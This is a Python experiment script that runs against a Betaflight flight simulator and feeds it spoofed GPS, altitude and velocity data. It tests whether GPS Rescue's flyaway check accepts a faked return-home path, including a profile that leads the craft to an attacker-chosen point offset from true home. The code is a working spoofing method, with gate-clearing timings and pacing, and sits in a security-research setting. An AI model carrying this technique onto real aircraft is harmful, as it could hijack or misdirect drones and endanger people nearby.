"""Horizontal channel of the "Tractor Beam" reproduction: does Betaflight's
GPS Rescue RESCUE_FLYAWAY check (gps_rescue_multirotor.c) follow a spoofed
distance-to-home trajectory, or reject it - including the case the user asked
for: given a real return-to-home position, make the firmware think it's
somewhere else entirely.

RESCUE_FLYAWAY only evaluates in RESCUE_FLY_HOME, several phases past
RESCUE_INITIALIZE. Reaching it needs two gates cleared first, both
characterized in earlier isolated experiments/probes:
  - RESCUE_ATTAIN_ALT: feed an altitude ramp at the FC's own ascend rate
    (see sanity_check_experiment.py's "adaptive" profile).
  - GPS-heading confidence (RESCUE_PITCH_FORWARD/RESCUE_ROTATE): feed a
    forward pitch + matching velocity_enu (see heading_confidence_probe.py;
    pitch=15deg, speed=7.5 m/s clears in ~3.6s, comfortably inside the 15s
    RESCUE_PITCH_FORWARD timeout).

Profiles (--profile):
  frozen                    reported position never approaches home ->
                             expect RESCUE_FLYAWAY (~20-25s failing window)
  naive-jump                reported position jumps straight to true home
                             the instant FLY_HOME begins -> expect accepted
                             (lands inside descentDistanceCm immediately,
                             transitions to RESCUE_DESCENT before FLYAWAY
                             could ever accumulate)
  adaptive-home              reported position closes on true home at the
                             FC's own configured ground speed -> expect
                             accepted (control, matches the altitude
                             channel's "adaptive" result)
  adaptive-fake-destination  reported position closes, at the same
                             qualifying rate, on an attacker-chosen point
                             offset from true home -> expect accepted; the
                             craft ends the rescue believing it arrived
                             home at a position it never actually reached

Uses debug_mode=RTH (not ATTITUDE) - see design.md: DEBUG_SET() only writes
the shared debug[] array for whichever debug_mode is active, so this script
relies on the pitch/speed values already validated by
heading_confidence_probe.py rather than reading live confidence back.

Usage (SITL running with sitl_safety.txt - debug_mode=RTH - applied):
    python3 horizontal_gate_experiment.py --profile frozen
    python3 horizontal_gate_experiment.py --profile naive-jump
    python3 horizontal_gate_experiment.py --profile adaptive-home
    python3 horizontal_gate_experiment.py --profile adaptive-fake-destination
"""

import argparse
import csv
import threading
import time

from tractorbeam.sitl_transport import SitlTransport, FdmState, results_csv_path
from tractorbeam.sitl_common import (
    meters_to_latlon_delta,
    latlon_dist_m,
    parse_rth_debug,
    parse_status_armed,
)

BOOT_GRACE_S = 10.0
FLY_OUT_METERS_NORTH = 500.0
ATTACK_OFFSET_METERS_EAST = 150.0
ALT_ASCEND_RATE_MS = (
    7.5  # confirmed clearing rate, sanity_check_experiment.py "adaptive"
)
ALT_CLEAR_MARGIN_S = 18.0  # >= the 13.3s observed clearing time, with margin

HEADING_PITCH_DEG = 15.0  # confirmed via heading_confidence_probe.py
HEADING_SPEED_MS = 7.5
HEADING_CLEAR_MARGIN_S = 10.0  # >= the ~3.6s observed clearing time, with margin

RESCUE_GROUND_SPEED_MS = 7.5  # gps_rescue_ground_speed default (750 cm/s)
MAX_TEST_S = 100.0  # once in FLY_HOME, per-profile budget


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--profile",
        required=True,
        choices=["frozen", "naive-jump", "adaptive-home", "adaptive-fake-destination"],
    )
    parser.add_argument(
        "--tag",
        default="",
        help="suffix for the output CSV, so repeat runs "
        "(for distribution sampling) don't overwrite each other",
    )
    args = parser.parse_args()

    transport = SitlTransport()
    state = FdmState()
    channels = [1500, 1500, 1000, 1500, 1000, 1000, 1000, 1000]
    running = True

    def fdm_loop():
        while running:
            transport.send_fdm(state, dt=0.01)
            time.sleep(0.01)

    def rc_loop():
        while running:
            transport.send_rc(channels)
            time.sleep(0.02)

    threading.Thread(target=fdm_loop, daemon=True).start()
    threading.Thread(target=rc_loop, daemon=True).start()

    home_lat, home_lon = state.lat, state.lon

    print(f"[{args.profile}] waiting {BOOT_GRACE_S:.0f}s boot grace...")
    time.sleep(BOOT_GRACE_S)

    channels[4] = 2000  # ARM
    time.sleep(1.0)

    d_lat, d_lon = meters_to_latlon_delta(FLY_OUT_METERS_NORTH, 0.0, home_lat)
    state.lat = home_lat + d_lat
    state.lon = home_lon + d_lon
    flyout_lat, flyout_lon = state.lat, state.lon
    print(f"[{args.profile}] flown out {FLY_OUT_METERS_NORTH}m north of home")
    time.sleep(1.0)

    channels[5] = 2000  # AUX2 high -> GPS Rescue
    t_trigger = time.time()
    print(
        f"[{args.profile}] rescue triggered - clearing ATTAIN_ALT and heading gates concurrently..."
    )

    # Both gates fed from t=0, NOT sequentially: RESCUE_PITCH_FORWARD's own 15s
    # giveup counter starts accumulating unconditionally the moment ATTAIN_ALT
    # clears (found empirically - clearing altitude first, then only starting
    # the pitch/velocity feed, let that counter run out before heading ever
    # had a chance to validate, landing in RESCUE_EMERG_DESCENT).
    state.pitch_deg = HEADING_PITCH_DEG
    state.set_velocity_towards(bearing_deg=0.0, speed_ms=HEADING_SPEED_MS)
    gate_window_s = max(ALT_CLEAR_MARGIN_S, HEADING_CLEAR_MARGIN_S)
    while time.time() - t_trigger < gate_window_s:
        state.alt = 100.0 + ALT_ASCEND_RATE_MS * (time.time() - t_trigger)
        time.sleep(0.05)
    print(f"[{args.profile}] gate window elapsed (alt={state.alt:.1f}m)")

    # Confirm phase before committing to the profile
    transport.send_msp(101)
    _, status_data = transport.read_msp()
    transport.send_msp(254)
    _, debug_data = transport.read_msp()
    phase, failure = parse_rth_debug(debug_data)
    armed = parse_status_armed(status_data)
    print(
        f"[{args.profile}] pre-profile check: armed={armed} phase={phase} failure={failure}"
    )
    if phase not in ("ROTATE", "FLY_HOME"):
        print(
            f"[{args.profile}] WARNING: expected ROTATE/FLY_HOME, got {phase} - "
            f"continuing anyway, ROTATE auto-advances to FLY_HOME after ~10s"
        )

    # Set up the profile's target and rate now, so we're ready the instant FLY_HOME starts
    if args.profile == "adaptive-fake-destination":
        d_lat_off, d_lon_off = meters_to_latlon_delta(
            0.0, ATTACK_OFFSET_METERS_EAST, home_lat
        )
        target_lat, target_lon = home_lat + d_lat_off, home_lon + d_lon_off
    else:
        target_lat, target_lon = home_lat, home_lon
    total_dist_m = latlon_dist_m(flyout_lat, flyout_lon, target_lat, target_lon)

    rows = []
    t_fly_home = None
    t0 = time.time()
    outcome = "TIMEOUT_HEALTHY"
    trigger_t = None

    while True:
        elapsed = time.time() - t0
        if elapsed > MAX_TEST_S:
            outcome, trigger_t = outcome, None
            print(f"[{args.profile}] max test duration reached, stopping")
            break

        transport.send_msp(254)
        _, debug_data = transport.read_msp()
        phase, failure = parse_rth_debug(debug_data)

        if phase == "FLY_HOME" and t_fly_home is None:
            t_fly_home = elapsed
            print(
                f"[{args.profile}] reached FLY_HOME at t={elapsed:.1f}s - "
                f"applying '{args.profile}' horizontal profile"
            )

        if t_fly_home is not None:
            since_fly_home = elapsed - t_fly_home
            if args.profile == "frozen":
                pass  # state.lat/lon already fixed at flyout position
            elif args.profile == "naive-jump":
                state.lat, state.lon = target_lat, target_lon
            else:  # adaptive-home, adaptive-fake-destination
                frac = (
                    min(1.0, (since_fly_home * RESCUE_GROUND_SPEED_MS) / total_dist_m)
                    if total_dist_m > 0
                    else 1.0
                )
                state.lat = flyout_lat + (target_lat - flyout_lat) * frac
                state.lon = flyout_lon + (target_lon - flyout_lon) * frac

        transport.send_msp(101)
        _, status_data = transport.read_msp()
        armed = parse_status_armed(status_data)

        dist_true_home = latlon_dist_m(state.lat, state.lon, home_lat, home_lon)
        dist_target = latlon_dist_m(state.lat, state.lon, target_lat, target_lon)

        row = {
            "t": round(elapsed, 1),
            "armed": armed,
            "phase": phase,
            "failure": failure,
            "reported_lat": round(state.lat, 7),
            "reported_lon": round(state.lon, 7),
            "dist_true_home_m": round(dist_true_home, 1),
            "dist_target_m": round(dist_target, 1),
        }
        rows.append(row)
        print(
            f"[{args.profile}] t={row['t']:6.1f}s armed={armed} phase={phase} failure={failure} "
            f"dist_home={dist_true_home:6.1f}m dist_target={dist_target:6.1f}m"
        )

        if armed is False:
            outcome, trigger_t = "REJECTED_DISARMED", row["t"]
            break
        if failure not in (None, "HEALTHY"):
            outcome, trigger_t = f"REJECTED_{failure}", row["t"]
            break
        if t_fly_home is not None and phase in ("DESCENT", "LANDING", "DO_NOTHING"):
            outcome, trigger_t = f"ACCEPTED_ADVANCED_TO_{phase}", row["t"]
            break

        time.sleep(0.5)

    print(
        f"[{args.profile}] RESULT: {outcome}"
        + (f" at t={trigger_t}s" if trigger_t else "")
    )

    suffix = f"_{args.tag}" if args.tag else ""
    out_path = results_csv_path(f"horizontal_gate_{args.profile}{suffix}.csv")
    with open(out_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
        writer.writerow(
            {
                "t": "RESULT",
                "armed": "",
                "phase": outcome,
                "failure": trigger_t,
                "reported_lat": "",
                "reported_lon": "",
                "dist_true_home_m": "",
                "dist_target_m": "",
            }
        )
    print(f"[{args.profile}] wrote {len(rows)} rows to {out_path}")

    running = False
    time.sleep(0.3)
    transport.close()


if __name__ == "__main__":
    main()
